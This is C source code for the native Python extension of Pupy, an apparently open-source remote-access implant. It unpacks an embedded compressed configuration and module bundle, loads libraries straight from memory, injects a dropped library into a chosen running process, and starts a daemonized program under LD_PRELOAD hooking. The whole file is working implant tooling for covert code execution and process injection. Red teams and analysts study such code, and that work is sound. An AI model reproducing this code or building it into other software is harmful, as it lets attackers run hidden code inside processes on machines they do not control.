/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/wait.h>
#include "debug.h"
#include "Python-dynload.h"
#include "daemonize.h"
#include <arpa/inet.h>
#include "tmplibrary.h"
#include <sys/mman.h>

#include "resources_library_compressed_string_txt.c"

int linux_inject_main(int argc, char **argv);

static const char module_doc[] = "Builtins utilities for pupy";

static const char pupy_config[8192]="####---PUPY_CONFIG_COMES_HERE---####\n";

extern const uint32_t dwPupyArch;

#include "lzmaunpack.c"

static PyObject *Py_get_modules(PyObject *self, PyObject *args)
{
	static PyObject *modules = NULL;
	if (!modules) {
		modules = PyObject_lzmaunpack(
			resources_library_compressed_string_txt_start,
			resources_library_compressed_string_txt_size
		);

		munmap(resources_library_compressed_string_txt_start,
			resources_library_compressed_string_txt_size);
	}

	return modules;
}

static PyObject *
Py_get_pupy_config(PyObject *self, PyObject *args)
{
	static PyObject *config = NULL;
	if (!config) {
		size_t compressed_size = ntohl(
			*((unsigned int *) pupy_config)
		);

		config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
	}

	return config;
}

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
	if(dwPupyArch==32){
		return Py_BuildValue("s", "x86");
	}
	else if(dwPupyArch==64){
		return Py_BuildValue("s", "x64");
	}
	return Py_BuildValue("s", "unknown");
}

static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
{
	const char *lpCmdBuffer;
	const char *lpDllBuffer;
	uint32_t dwDllLenght;
	PyObject* py_HookExit;

	if (!PyArg_ParseTuple(args, "zs#O", &lpCmdBuffer, &lpDllBuffer, &dwDllLenght, &py_HookExit))
		return NULL;

	char ldobject[PATH_MAX]={};
	if (!drop_library(ldobject, PATH_MAX, lpDllBuffer, dwDllLenght)) {
		dprint("Couldn't drop library: %m\n");
		return NULL;
	}
	char cmdline[PATH_MAX*2] = {};
	snprintf(
		cmdline, sizeof(cmdline), "LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=1 exec %s",
		ldobject,
		PyObject_IsTrue(py_HookExit),
		lpCmdBuffer,
		ldobject
	);

	dprint("Program to execute in child context: %s\n", cmdline);

	pid_t pid = daemonize(0, NULL, NULL, false);
	if (pid == 0) {
		/* Daemonized context */
		execl("/bin/sh", "/bin/sh", "-c", cmdline, NULL);
		unlink(ldobject);
		exit(255);
	}

	if (pid == -1) {
		dprint("Couldn\'t daemonize: %m\n");
		unlink(ldobject);
		return PyInt_FromLong(-1);
	}

	return PyInt_FromLong(pid);
}

static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
	uint32_t dwPid;
	const char *lpDllBuffer;
	uint32_t dwDllLenght;
	const char *cpCommandLine;
	PyObject* py_is64bit;
	int is64bits;
	if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
		return NULL;

	dprint("Injection requested. PID: %d\n", dwPid);

	is64bits = PyObject_IsTrue(py_is64bit);
	if(is64bits){
		is64bits=64;
	}else{
		is64bits=32;
	}

	char buf[PATH_MAX]={};
	if (!drop_library(buf, PATH_MAX, lpDllBuffer, dwDllLenght)) {
		dprint("Couldn't drop library: %m\n");
		return NULL;
	}

	char pid[20] = {};
	snprintf(pid, sizeof(pid), "%d", dwPid);

	char *linux_inject_argv[] = {
		"linux-inject", "-p", pid, buf, NULL
	};

	pid_t injpid = fork();
	if (injpid == -1) {
		dprint("Couldn't fork\n");
		unlink(buf);
		return PyBool_FromLong(1);
	}

	int status;

	if (injpid == 0) {
		int r = linux_inject_main(4, linux_inject_argv);
		exit(r);
	} else {
		waitpid(injpid, &status, 0);
	}

	unlink(buf);

	if (WEXITSTATUS(status) == 0) {
		return PyBool_FromLong(1);
	} else {
		dprint("Injection failed\n");
		return PyBool_FromLong(0);
	}
}

static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
	uint32_t dwPid;
	const char *lpDllBuffer;
	uint32_t dwDllLenght;
	const char *dllname;
	if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
		return NULL;

	printf("Py_load_dll(%s)\n", dllname);

	if(memdlopen(dllname, lpDllBuffer, dwDllLenght))
		return PyBool_FromLong(1);
	return PyBool_FromLong(0);
}

static PyMethodDef methods[] = {
	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
	{ "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
	{ "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
	{ NULL, NULL },		/* Sentinel */
};

DL_EXPORT(void)
initpupy(void)
{
	Py_InitModule3("pupy", methods, module_doc);
}
